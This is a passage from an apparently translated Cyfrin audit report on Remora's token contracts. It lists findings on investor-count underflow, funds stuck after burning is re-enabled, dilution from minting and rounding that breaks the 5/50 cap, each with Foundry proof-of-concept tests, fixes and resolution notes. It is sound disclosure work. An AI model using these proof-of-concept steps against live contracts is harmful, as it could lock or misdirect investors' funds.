        uint256 value
    ) internal override {
@1>     if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;
@2>     if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;
...
```

- `@1>` 줄은 `totalInvestors`를 감소시키지만,
- `@2>` 줄은 `balanceOf(to)`가 전송 전 잔액이므로 증가를 유발하지 않습니다.


**영향:** `totalInvestors`는 정보 제공 목적으로만 사용되므로 대부분의 경우 영향은 미미합니다.
그러나 충분히 많이 수행되면 정확히 다음과 같은 경우 언더플로우가 발생합니다.
- `totalInvestors == 0`이고
- 사용자가 자신의 모든 토큰을 다른 사용자에게 전송하는 경우

**개념 증명 (Proof of Concept):** `CentralTokenTest.t.sol`에 다음 테스트를 추가하십시오.

```solidity

    function test_cyfrin_selfTransferDecrements() public {
        address user = getDomesticUser(1);
        uint32 DEFAULT_LOCK_TIME = 365 days;

        // Seed: old user has 3 tokens (locked by default on mint)
        centralTokenProxy.mint(address(this), uint64(3));
        centralTokenProxy.dynamicTransfer(user, 3);
        assertEq(d_childTokenProxy.balanceOf(user), 3);
        assertEq(d_childTokenProxy.totalInvestors(), 1);

        vm.warp(block.timestamp + DEFAULT_LOCK_TIME); // warp to unlock tokens
        vm.prank(user);
        d_childTokenProxy.transfer(user, 3);

        assertEq(d_childTokenProxy.totalInvestors(), 0);
        assertEq(d_childTokenProxy.balanceOf(user), 3);

        // Do it one more time and we get a revert
        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);  // warp to unlock tokens
        vm.prank(user);
        vm.expectRevert(); // expect underflow
        d_childTokenProxy.transfer(user, 3);
    }
```

**권장 완화 조치:** `from == to`인 경우 투자자 수에 아무런 조치를 취하지 마십시오.

```diff
+       if (from != to) {
            if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;
            if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;
+       }

        super._update(from, to, value);
```

**Remora:** 커밋 [b612c87](https://github.com/remora-projects/remora-dynamic-tokens/commit/b612c8735b9da1e563af7b0071f3da0c67d60702)에서 수정됨.

**Cyfrin:** 확인함. `from`과 `to`가 같은 주소인 경우 `totalInvestors` 카운터가 수정되지 않습니다.


### `CentralToken::disableBurning`으로 소각 비활성화 후 `PaymentSettler::enableBurning` 호출 시 자금 묶임

**설명:** `PaymentSettler::enableBurning(...)`이 호출된 후에도 관리자가 `CentralToken::disableBurning()`을 직접 호출하여 하위 토큰 소각을 비활성화할 수 있습니다.

소각을 다시 활성화하는 올바른 방법은 `CentralToken::enableBurning(burnPayout)`을 호출하는 것입니다(이 경우 `burnPayout` 매개변수는 무시됨).

그러나 관리자가 대신 `PaymentSettler::enableBurning()`을 호출하는 실수가 발생할 수 있습니다. 예상되지 않을 수 있지만, 중앙 토큰에 대한 `TokenData`에 대한 확인이 없고 대신 확인이 [PaymentSettler.sol#L184](https://github.com/remora-projects/remora-dynamic-tokens/blob/6365a9e970758605f973ce0319236805e4188986/contracts/CoreContracts/PaymentSettler.sol#L184)의 `CentralToken.enableBurning` 외부 호출로 지연되기 때문에 성공합니다.

불행히도 `CentralToken::enableBurning`의 로직은 `PaymentSettler` 컨트랙트에서 호출될 때 `totalBurnPayout`을 *덮어씁니다*.

```solidity
    function enableBurning(uint64 burnPayout) external nonReentrant {
        address sender = _msgSender();
        if (sender != paymentSettler)
            _checkCanCall(sender, _msgData());
@>      else totalBurnPayout = burnPayout;
    ...
```

- 각 토큰의 가치는 `totalBurnPayout / preBurnSupply`로 계산됩니다.
- `B1`/`B2`를 `PaymentSettler::enableBurning`에 대한 첫 번째/두 번째 호출에 추가된 자금이라고 합시다.
- `S`를 `preBurnSupply`라고 합시다.
- 비활성화 전에 `x` 토큰이 소각되었다고 가정합니다. `x < S`라고 가정합니다.
- 다시 활성화 후 남은 `S - x` 토큰이 소각된다고 가정합니다.
- 그러면 소각된 모든 토큰의 총 가치는 `(x * B1 / S) + (S - x)*B2 / S`입니다.
- 그러나 소각을 위해 `PaymentSettler`에 투입된 총 가치는 `B1 + B2`였습니다.

`PaymentSettler` 컨트랙트에 남은 스테이블코인 가치

```
   (B1 + B2) - (x * B1 / S + (S - x)*B2/S)
== (B1 + B2) - (x * B1 / S + S * B2 / S - x * B2 / S)
== (B1 + B2) - (x/S* (B1 - B2) + B2)
== B1 - x/S * (B1 - B2)
```

1. `B1 - B2 < 0`이면 이것은 분명히 양수입니다.
2. `B1 - B2 > 0`이면 `x/S * (B1 - B2)`의 최대값은 `B2 == 0`일 때 발생합니다. 그러나 `x/S < 1`이므로 `B1 - x/S*B1 > 0`입니다.

따라서 자금은 항상 컨트랙트에 묶이게 됩니다.

**영향:** 소각이 비활성화된 다음 `PaymentSettler::enableBurning`으로 다시 활성화되면 자금이 컨트랙트에 묶입니다.

**개념 증명 (Proof of Concept):** `PaymentSettlerTest.t.sol`에 다음을 추가하십시오. 상수가 변경되어도(대문자) Assert 문은 유지됩니다.

```solidity
    function test_cyfrin_EnableAfterDisableLeadsToStuckFunds() public {
        address user0 = getDomesticUser(0);
        address user1 = getDomesticUser(1);
        uint64 BURN_FUNDS_0 = 1_000_000e6;
        uint64 BURN_FUNDS_1 = 700_000e6;

        uint64 INITIAL_SUPPLY = 10_000;
        uint64 BURN_AMOUNT = 3000;

        centralTokenProxy.mint(address(this), INITIAL_SUPPLY);
        centralTokenProxy.dynamicTransfer(user0, BURN_AMOUNT);
        centralTokenProxy.dynamicTransfer(user1, INITIAL_SUPPLY - BURN_AMOUNT);

        (uint128 usdBal0 , , bool burnEnabled0,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal0, 0);
        assertEq(burnEnabled0, false);

        // initiateBurning
        paySettlerProxy.initiateBurning(address(centralTokenProxy));
        skip(1 days + 1);

        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);
        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), BURN_FUNDS_0);
        (uint128 usdBal1,,bool burnEnabled1,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal1, 1_000_000e6);
        assertEq(centralTokenProxy.totalSupply(), INITIAL_SUPPLY);
        assertEq(centralTokenProxy.preBurnSupply(), INITIAL_SUPPLY);
        assertEq(centralTokenProxy.totalBurnPayout(), BURN_FUNDS_0);
        assertEq(burnEnabled1, true);

        vm.startPrank(user0);
        d_childTokenProxy.burn(); // burns INITIAL_SUPPLY - BURN_AMOUNT tokens
        vm.stopPrank();

        (uint128 usdBal2,,,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal2, BURN_FUNDS_0 - BURN_AMOUNT * BURN_FUNDS_0 / INITIAL_SUPPLY);
        assertEq(centralTokenProxy.totalSupply(), INITIAL_SUPPLY - BURN_AMOUNT);
        assertEq(centralTokenProxy.preBurnSupply(), INITIAL_SUPPLY);
        assertEq(centralTokenProxy.totalBurnPayout(), BURN_FUNDS_0);

        // Disable Burning
        centralTokenProxy.disableBurning();
        (,,bool burnEnabled2_5,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(burnEnabled2_5, true); // PaymentSettler still reports that the burn is enabled

        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), BURN_FUNDS_1);
        (uint128 usdBal3 , , , bool burnEnabled3) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal3, usdBal2 + BURN_FUNDS_1);
        assertTrue(burnEnabled3);
        uint256 totalSupply3 = centralTokenProxy.totalSupply();
        uint64  preBurnSupply3 = centralTokenProxy.preBurnSupply();
        uint64  totalBurnPayout3 = centralTokenProxy.totalBurnPayout();
        uint256 valueOfTokens = totalSupply3 * totalBurnPayout3 / preBurnSupply3;

        assertEq(totalSupply3, INITIAL_SUPPLY - BURN_AMOUNT);
        assertEq(preBurnSupply3, INITIAL_SUPPLY);
        assertEq(totalBurnPayout3, BURN_FUNDS_1);

        vm.startPrank(user1);
        d_childTokenProxy.burn(); // burn all remaining tokens
        vm.stopPrank();

        (uint128 usdBalEnd , , , ) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBalEnd, usdBal2 + BURN_FUNDS_1 - valueOfTokens);
        assertEq(int64(uint64(usdBalEnd)), int64(BURN_FUNDS_0) - int64(BURN_AMOUNT) * (int64(BURN_FUNDS_0) - int64(BURN_FUNDS_1))/ int64(INITIAL_SUPPLY));
        assertEq(centralTokenProxy.totalSupply(), 0);
    }
```

**권장 완화 조치:** `PaymentSettler::enableBurning`을 통한 소각 재활성화를 아마도 확인을 추가하여 완전히 비활성화하는 것이 좋습니다.

```diff
+    error TokenBurningAlreadyEnabled();
```

```diff
    function enableBurning(
        address token,
        address fundingWallet,
        uint64 value
    ) external nonReentrant restricted {
        if (value == 0) revert InvalidValuePassed();
        TokenData storage t = tokenData[token];
+       if (t.burnEnabled) revert TokenBurningAlreadyEnabled();
        if (!t.active) revert InvalidTokenAddress();
...
```

**Remora:** 커밋 [45e9745](https://github.com/remora-projects/remora-dynamic-tokens/commit/45e974546e47d4e8248374b31f0cc01d07dcf04b)에서 수정됨.

**Cyfrin:** 확인함. 소각을 한 번 이상 활성화하는 것을 방지하기 위한 확인을 추가했습니다.



### 소각 비활성화와 재활성화 사이의 발행(Minting)은 자금 묶임 및 후기 소각자 희석으로 이어짐

### 설명

`PaymentSettler::enableBurning`이 호출된 후 관리자가 하위 토큰의 상위 항목에서 직접 `CentralToken::disableBurning`을 호출하여 하위 토큰 소각을 비활성화할 수 있습니다.

그러나 `mint`의 다음 줄 때문에 `disableBurning`이 호출되면 관리자가 `mint`를 호출할 수 있습니다.

```solidity
    function mint(address to, uint64 amount) external nonReentrant whenNotPaused restricted {
        if (amount == 0) return;
@>      if (mintDisabled || burnable()) revert MintDisabled();
        _checkAllowedAdmin(to);
        _mint(to, amount);
        preBurnSupply += amount;
        emit TokensMinted(to, amount);
```

소각을 재개할 수 있는 두 가지 방법이 있습니다.
1. `PaymentSettler::enableBurning`
2. `CentralToken::enableBurning`

그러나 둘 다 CentralToken 컨트랙트에 자금이 묶이는 결과를 초래합니다.

`PaymentSettler::enableBurning`의 문제는 [*`CentralToken::disableBurning`으로 소각 비활성화 후 `PaymentSettler::enableBurning` 호출 시 자금 묶임*](#after-disabling-burning-with-centraltokendisableburning-calling-paymentsettlerenableburning-leads-to-stuck-funds) 이슈에서도 다루어집니다. 그러나 여기서는 구체적인 사례를 살펴보겠습니다.

**사례 1: `PaymentSettler::enableBurning`**

명확성을 위해 특정 값을 사용합니다.

- 초기 10,000 `CentralToken`이 발행됩니다. `totalSupply == 10_000`. `preBurnSupply == 10_000`
- `PaymentSettler::enableBurning(centralToken, fundingWallet, 1_000_000e6)`이 호출되어 1,000,000 USDC를 추가합니다.
  * 중앙 토큰에 대한 `PaymentSettler`의 토큰 데이터를 `t`라고 합시다. 따라서 `t.balance = 1_000_000e6`
  * 간접적으로 이는 `CentralToken`의 `totalBurnPayout` 스토리지 변수를 `1_000_000e6`으로 설정합니다.
- 이 중 5,000개가 소각되어(토큰당 100 USDC 감소) `t.balance`를 `500_000e6`으로 줄이고 `totalSupply`를 `5000`으로 줄입니다.
- `CentralToken.disableBurning()`으로 소각이 비활성화됩니다.
- `CentralToken::mint`가 호출되어 추가 6,000 토큰을 발행합니다. `totalSupply = 11_000`
  * 그러나 `preBurnSupply`는 `16_000`으로 증가합니다.
- 이제 `PaymentSettler::enableBurning(centralToken, fundingWallet, 600_000e6)`이 호출됩니다.
  * `t.balance`는 `1_100_000e6`으로 증가합니다.
  * [*`CentralToken::disableBurning`으로 소각 비활성화 후 `PaymentSettler::enableBurning` 호출 시 자금 묶임*](#after-disabling-burning-with-centraltokendisableburning-calling-paymentsettlerenableburning-leads-to-stuck-funds) 이슈에 설명된 대로 이것은 `totalBurnPayout`을 `600_000e6`으로 *덮어씁니다*.
- 이제 다음이 있습니다.
  * `11_000` 하위 토큰
  * `preBurnSupply = 16_000`
  * `t.balance = 1_100_000e6`
  * `totalBurnPayout == 600_000e6`
- 각 토큰은 `totalBurnPayout / preBurnSupply` 스테이블 코인으로 상환될 수 있습니다. 이는 `600_000e6 / 16_000 == 37.5e6`입니다. 그들은 `totalBurnPayout`이 재정의되었다는 사실에 의해 심하게 희석되었습니다.
- 이것은 `t.balance`를 `11_000 * 37.5e6 == 412_500e6`만큼 줄여 `687_500e6`으로 만드는데, 이는 이제 묶인 자금입니다.

**사례 2: `CentralToken::enableBurning`**

이 사례는 5,000개의 새로운 중앙 토큰을 발행하는 시점까지 이전과 동일합니다.

하지만 이제:
- `CentralToken::enableBurning`이 호출됩니다(`burnPayout` 매개변수는 무시됨).
- 이제 다음이 있습니다.
  * `11_000` 하위 토큰
  * `preBurnSupply = 16_000`
  * `t.balance = 500_000e6`
  * `totalBurnPayout == 1_600_000e6`
- 이번에는 각 토큰이 `1_000_000e6 / 16_000 == 62.5e6`으로 상환될 수 있다고 계산합니다.
- 남은 모든 하위 토큰의 총 가치는 `11_000 * 62.5e6 == 687_500e6`입니다.
- `t.balance`는 이를 충당하기에 충분하지 않으므로 이제 일부 하위 토큰은 소각조차 할 수 없습니다.

이것만으로도 충분히 나쁘지만, 시나리오를 약간 변경하여 `t.balance`에 재산의 배당금/임대료도 포함되어 있어 남은 하위 토큰을 소각하는 데 필요한 `687_500e6`을 충당할 수 *있는* 경우, 이를 소각하면 실제로는 처음 5,000 토큰의 소각자가 청구하지 않았을 수 있는 배당금/임대료를 훔치는 것이 됩니다.

**영향:** `PaymentSettler::enableBurning`으로 소각이 다시 활성화되면 자금이 (일반적으로) 묶이게 됩니다.

`CentralToken::enableBurning`으로 소각이 다시 활성화되면, 많은 경우 `PaymentSettler` 컨트랙트에 모든 토큰 소각을 충당할 충분한 자금이 없을 것입니다. 또한 `PaymentSettler`에 지급금(소각을 위한 자금 외에)이 포함되어 있으면 소각은 다른 사용자의 미청구 지급금을 훔치는 효과를 가질 수 있습니다.

**개념 증명 (Proof of Concept):** `PaymentSettlerTest.t.sol`에 다음을 추가하십시오.

```solidity
    function test_cyfrin_MintBetweenDisableEnableBurn_Case1() public {
        address user0 = getDomesticUser(0);
        address user1 = getDomesticUser(1);
        centralTokenProxy.mint(address(this), uint64(10000));
        centralTokenProxy.dynamicTransfer(user0, 5000);
        centralTokenProxy.dynamicTransfer(user1, 5000);

        (uint128 usdBal0 , , bool burnEnabled0,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal0, 0);
        assertEq(burnEnabled0, false);

        // initiateBurning
        paySettlerProxy.initiateBurning(address(centralTokenProxy));
        skip(1 days + 1);

        uint64 burnFunds0 = 1_000_000e6; // first funding (USD6 units)
        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);
        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), burnFunds0);
        (uint128 usdBal1,,bool burnEnabled1,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal1, 1_000_000e6);
        assertEq(centralTokenProxy.totalSupply(), 10_000);
        assertEq(centralTokenProxy.preBurnSupply(), 10_000);
        assertEq(centralTokenProxy.totalBurnPayout(), 1_000_000e6);
        assertEq(burnEnabled1, true);

        vm.startPrank(user0);
        d_childTokenProxy.burn(); // burns 5000 tokens
        vm.stopPrank();
        (uint128 usdBal2,,,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal2, 500_000e6);
        assertEq(centralTokenProxy.totalSupply(), 5_000);
        assertEq(centralTokenProxy.preBurnSupply(), 10_000);
        assertEq(centralTokenProxy.totalBurnPayout(), 1_000_000e6);

        // Disable Burning
        centralTokenProxy.disableBurning();
        (,,bool burnEnabled2_5,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(burnEnabled2_5, true); // PaymentSettler still reports that the burn is enabled

        // Mint new tokens and distribute to user1
        centralTokenProxy.mint(address(this), 6_000);
        centralTokenProxy.dynamicTransfer(user1, 6_000);

        uint64 burnFunds1 = 600_000e6;
        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), burnFunds1);
        (uint128 usdBal3 , , , bool burnEnabled3) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal3, 1_100_000e6);
        assertTrue(burnEnabled3);
        assertEq(centralTokenProxy.totalSupply(), 11_000);
        assertEq(centralTokenProxy.preBurnSupply(), 16_000);
        assertEq(centralTokenProxy.totalBurnPayout(), 600_000e6);

        vm.startPrank(user1);
        d_childTokenProxy.burn(); // burn all remaining tokens
        vm.stopPrank();

        (uint128 usdBalEnd , , , ) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBalEnd, 687_500e6);
        assertEq(centralTokenProxy.totalSupply(), 0);
    }

    function test_cyfrin_MintBetweenDisableEnableBurn_Case2() public {
        address user0 = getDomesticUser(0);
        address user1 = getDomesticUser(1);
        centralTokenProxy.mint(address(this), uint64(10000));
        centralTokenProxy.dynamicTransfer(user0, 5000);
        centralTokenProxy.dynamicTransfer(user1, 5000);

        (uint128 usdBal0 , , bool burnEnabled0,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal0, 0);
        assertEq(burnEnabled0, false);

        // initiateBurning
        paySettlerProxy.initiateBurning(address(centralTokenProxy));
        skip(1 days + 1);

        uint64 burnFunds0 = 1_000_000e6; // first funding (USD6 units)
        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);
        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), burnFunds0);
        (uint128 usdBal1,,bool burnEnabled1,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal1, 1_000_000e6);
        assertEq(centralTokenProxy.totalSupply(), 10_000);
        assertEq(centralTokenProxy.preBurnSupply(), 10_000);
        assertEq(centralTokenProxy.totalBurnPayout(), 1_000_000e6);
        assertEq(burnEnabled1, true);

        vm.startPrank(user0);
        d_childTokenProxy.burn(); // burns 5000 tokens
        vm.stopPrank();
        (uint128 usdBal2,,,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal2, 500_000e6);
        assertEq(centralTokenProxy.totalSupply(), 5_000);
        assertEq(centralTokenProxy.preBurnSupply(), 10_000);
        assertEq(centralTokenProxy.totalBurnPayout(), 1_000_000e6);

        // Disable Burning
        centralTokenProxy.disableBurning();
        (,,bool burnEnabled2_5,) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(burnEnabled2_5, true); // PaymentSettler still reports that the burn is enabled

        // Mint new tokens and distribute to user1
        centralTokenProxy.mint(address(this), 6_000);
        centralTokenProxy.dynamicTransfer(user1, 6_000);

        centralTokenProxy.enableBurning(0); // burnPayout parameter ignored
        (uint128 usdBal3 , , , bool burnEnabled3) = paySettlerProxy.tokenData(address(centralTokenProxy));
        assertEq(usdBal3, 500_000e6);
        assertTrue(burnEnabled3);
        uint256 totalSupply3 = centralTokenProxy.totalSupply();
        uint64  preBurnSupply3 = centralTokenProxy.preBurnSupply();
        uint64  totalBurnPayout3 = centralTokenProxy.totalBurnPayout();
        uint256 valueOfTokens = totalSupply3 * totalBurnPayout3 / preBurnSupply3;

        assertEq(valueOfTokens, 687_500e6);
        assertGt(valueOfTokens, usdBal3);
        assertEq(totalSupply3, 11_000);
        assertEq(preBurnSupply3, 16_000);
        assertEq(totalBurnPayout3, 1_000_000e6);

        vm.startPrank(user1);
        vm.expectPartialRevert(bytes4(keccak256("InsufficientBalance(address)")));
        d_childTokenProxy.burn(); // burn all remaining tokens
        vm.stopPrank();
    }
```

**Remora:** 커밋 [a27fae3](https://github.com/remora-projects/remora-dynamic-tokens/commit/a27fae35aef4f5d695401ee289c8a2dc19f2be31)에서 수정됨.

**Cyfrin:** 확인함. 소각 로직을 리팩토링하여 소각 활성화를 한 번만 허용하도록 했습니다. 활성 소각을 비활성화한 다음 다시 활성화하는 것은 더 이상 불가능합니다.


### `FiveFiftyRule::_updateEntityAllowance`가 엔터티 허용량 차감 시 잘못된 방향으로 반올림함

**설명:** `_updateEntityAllowance` 함수는 매개변수 `add`가 `true`/`false`인지에 따라 엔터티 허용량을 늘리거나 줄이는 데 사용됩니다.

`add == false`일 때 `adjusted_amt`는 뺄 금액입니다. 그러나 나눗셈이 포함되므로 잘립니다.
이는 `aData.allowance - adjusted_amt`가 실제 값보다 더 커짐을 의미합니다.

최악의 시나리오에서는 허용량이 너무 커져서 이후 엔터티로의 전송이 5/50 규칙을 위반하게 만들 수 있습니다.

**영향:** 극단적인 경우 5/50 규칙이 위반될 수 있습니다. [*`FiveFiftyRule::_updateEntityAllowance`에서 곱하기 전 나누기로 인한 정밀도 손실로 캡 초과 발생*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) 이슈에서 확인된 버그는 곱셈 전 나눗셈으로 인해 값이 실제 값보다 훨씬 작아지므로 이 가능성을 훨씬 더 높입니다.

**개념 증명 (Proof of Concept):**
1. 이 diff는 이 특정 문제를 모호하게 하는 버그를 수정합니다.

```diff
@@ -465,8 +465,8 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {
         uint256 len = ents.length;
         for (uint256 i; i<len; ++i) {
             EntityData memory a = entityData[ents[i]];
-            if (a.catalyst == inv &&
-                (REMORA_PERCENT_DENOMINATOR / a.equity) * amount >
+            if (a.catalyst == inv &&
+                REMORA_PERCENT_DENOMINATOR * amount / a.equity >
                     entityData[ents[i]].allowance
             ) return false;
         }
@@ -505,16 +505,16 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {
         // to side changes
         if (to != address(0)) {
             IndividualData storage iTo = individualData[to];
-
+
             if (iTo.isEntity) { // if entity
-                if (entityData[to].allowance <= amount) {
-                    entityData[to].allowance -= SafeCast.toUint64(amount);
+                if (entityData[to].allowance >= amount) {
+                    entityData[to].allowance -= SafeCast.toUint64(amount);

                     iTo.lastBalance += SafeCast.toUint64(amount);
                     emit FiveFiftyApproved(from, to, amount);
                     return true;
                 } else revert ();
```

2. 이 개념 증명은 촉매제가 10%에 해당하는 노출을 가질 수 있음을 보여줍니다(9.999999%로 항상 그 미만이어야 함).

**참고**: [*`FiveFiftyRule::_updateEntityAllowance`에서 곱하기 전 나누기로 인한 정밀도 손실로 캡 초과 발생*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) 이슈의 "곱하기 전 나누기" 버그가 수정되지 않으면 `CATALYST_BAL = 700_000` 값은 여전히 되돌리지 않아 유효 캡이 약 2% 초과됩니다!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/console2.sol";
import {RemoraTestBase} from "../RemoraTestBase.sol";
import {FiveFiftyRule} from "../../../contracts/Compliance/FiveFiftyRule.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";


contract FiveFiftyRule_RoundingPoC is RemoraTestBase {
    FiveFiftyRule internal fiveFiftyRule;

    // helpers (same as your math discussion)
    uint256 constant DENOM = 1_000_000;

    function setUp() public override {
        RemoraTestBase.setUp();

        // Deploy rule and initialize
        fiveFiftyRule = FiveFiftyRule(address(new ERC1967Proxy(address(new FiveFiftyRule()), "")));
        fiveFiftyRule.initialize(address(accessMgrProxy), 0);

        // Allow our test to call restricted functions on fiveFiftyRule and child
        bytes4[] memory sel = new bytes4[](1);
        sel[0] = FiveFiftyRule.addToken.selector;
        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), sel, ADMIN_TOKEN_ID);
        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);

        bytes4[] memory cs = new bytes4[](2);
        cs[0] = bytes4(keccak256("setFiveFiftyCompliance(address)"));
        cs[1] = bytes4(keccak256("setLockUpTime(uint32)"));
        accessMgrProxy.setTargetFunctionRole(address(d_childTokenProxy), cs, ADMIN_TOKEN_ID);

        // Wire fiveFiftyRule to domestic child; remove lockup
        d_childTokenProxy.setFiveFiftyCompliance(address(fiveFiftyRule));
        d_childTokenProxy.setLockUpTime(0);
    }

    function test_RoundingDown_Allows_ExtraEntityToken_ExceedingLookThroughCap() public {
        // --------------------------
        // Parameters we use for the PoC
        // --------------------------
        // Total supply: large, so we can transfer a very large amount to the catalyst without violating the cap.
        // We'll target a 50% cap for the catalyst (to leave room for a huge direct transfer).
        uint64 totalSupply = 10_000_000;
        uint32 capPercent = 100_000;
        uint64 capAmountMicros = totalSupply * capPercent;

        uint64 equityMu = 333_334;
        uint256 ENTITY_BAL = 1_500_000;
        uint256 CATALYST_BAL = 499_999;

        centralTokenProxy.mint(address(this), totalSupply);
        fiveFiftyRule.addToken(address(centralTokenProxy));

        // Choose a catalyst (a domestic user) and an entity address
        address entity = getDomesticUser(0);
        address catalyst = getDomesticUser(1);
        address otherInvestor = getDomesticUser(2); // will never directly own any tokens in this example
        address[] memory investors = new address[](2);
        investors[0] = catalyst;
        investors[1] = otherInvestor;

        bytes4[] memory psel = new bytes4[](1);
        psel[0] = bytes4(keccak256("setMaxPercentIndividual(address,uint32)"));
        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), psel, ADMIN_TOKEN_ID);
        fiveFiftyRule.setMaxPercentIndividual(catalyst, capPercent);


        bytes4[] memory esel = new bytes4[](2);
        esel[0] = bytes4(keccak256("createEntity(address,address,uint64,uint64,address[])"));
        esel[1] = bytes4(keccak256("setCatalyst(bool,address,address,uint64,uint64)"));
        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), esel, ADMIN_TOKEN_ID);


        uint64 calculatedAllowance = SafeCast.toUint64(totalSupply * 1e6 * capPercent / equityMu);
        console2.log("calculatedAllowance: %s", calculatedAllowance);

        // Check that allowance is correct
        uint256 userProportion = calculatedAllowance * equityMu / 1e6;
        assertEq(userProportion, capAmountMicros - 1);

        uint256 exposure = uint256(ENTITY_BAL)* 1e6 * equityMu / 1e6 + CATALYST_BAL * 1e6;
        console2.log("exposure: %s", exposure);
        assertGe(exposure, capAmountMicros);


        fiveFiftyRule.createEntity(entity, catalyst, equityMu, calculatedAllowance, investors);
        centralTokenProxy.dynamicTransfer(entity, ENTITY_BAL);
        logEntity("0", entity);
        logIndividual("entity 0", entity);
        logIndividual("catalyst 0", catalyst);

        centralTokenProxy.dynamicTransfer(catalyst, CATALYST_BAL);
        logEntity("1", entity);
        logIndividual("entity 1", entity);
        logIndividual("catalyst 1", catalyst);

    }

    function logEntity(string memory s, address entity) internal view {
        FiveFiftyRule.EntityData memory ed = fiveFiftyRule.testing_entityData(entity);
        console2.log("---  EntityData %s ---", s );
        console2.log("catalyst:     %s", ed.catalyst);
        console2.log("equity:       %s", ed.equity);
        console2.log("allowance:    %s", ed.allowance);
    }

    function logIndividual(string memory s, address individual) internal view {
        FiveFiftyRule.IndividualData memory id = fiveFiftyRule.testing_individualData(individual);
        console2.log("---  IndividualData %s ---", s);
        console2.log("isEntity:         %s", id.isEntity);
        console2.log("numCatalyst:      %s", id.numCatalyst);
        console2.log("groupId:          %s", id.groupId);
        console2.log("customMaximum:    %s", id.customMaximum);
        console2.log("lastBalance:      %s", id.lastBalance);

    }
}
```

**권장 완화 조치:** `add == false`일 때 `adjusted_amt`를 올림해야 합니다.

각각 내림/올림하는 `_mulDivFloor` 및 `_mulDivCeil`의 존재를 가정하고 코드를 아래와 같이 업데이트하십시오.
또한 [*`FiveFiftyRule::_updateEntityAllowance`에서 곱하기 전 나누기로 인한 정밀도 손실로 캡 초과 발생*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) 이슈의 수정 사항도 포함되어 있습니다.

```solidity
function _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {
    uint8 numCatalyst = individualData[inv].numCatalyst;
    uint256 len = findEntity[inv].length;

    for (uint256 i; i < len; ++i) {
        if (numCatalyst == 0) break;

        EntityData storage aData = entityData[findEntity[inv][i]];
        if (aData.catalyst != inv) continue;
        --numCatalyst;

        uint256 adjusted;
        if (add) {
            adjusted = _mulDivFloor(amount, REMORA_PERCENT_DENOMINATOR, aData.equity);
            aData.allowance += SafeCast.toUint64(adjusted);
        } else {
            adjusted = _mulDivCeil(amount, REMORA_PERCENT_DENOMINATOR, aData.equity);
            uint64 adj64 = SafeCast.toUint64(adjusted);
            if (adj64 > aData.allowance) return false;
            aData.allowance -= adj64;
        }
    }
    return true;
}
```

**Remora:** 커밋 [e12af9d](https://github.com/remora-projects/remora-dynamic-tokens/commit/e12af9dd70476a143f444a793aff3538b136ca1a)에서 수정됨.

**Cyfrin:** 확인함. 권장 완화 조치를 구현했습니다.


### `FiveFiftyRule`의 `createEntity` 및 `setCatalyst` 함수에 `equity != 0` 확인 추가

**설명:** `equity`가 0으로 설정되면 `_checkEntityAllowance`는 0으로 나누기로 인해 되돌려지며 `_checkEntityAllowance`와 관련된 코드 경로를 통과하는 모든 전송을 방지합니다.

이것은 다음인 `to` 주소로의 전송과 관련된 전송이 발생할 때마다 발생합니다.
- 촉매제인 개인이 있는 그룹의 일부
- 촉매제인 개인

**영향:** 미미함. 관리자가 `setCatalyst`를 호출하여 `equity`를 0이 아닌 값으로 업데이트할 때까지 되돌리기가 발생합니다.

**Remora:** 커밋 [511e7da](https://github.com/remora-projects/remora-dynamic-tokens/commit/511e7da2038e669f628c8232fd8f37c1e6798fab)에서 수정됨.

**Cyfrin:** 확인함.

\clearpage
## 정보 (Informational)


### 관리자가 승인 후 `CentralToken::transferFrom`을 사용하여 하위 토큰의 1:1 불변성을 깨뜨릴 수 있음

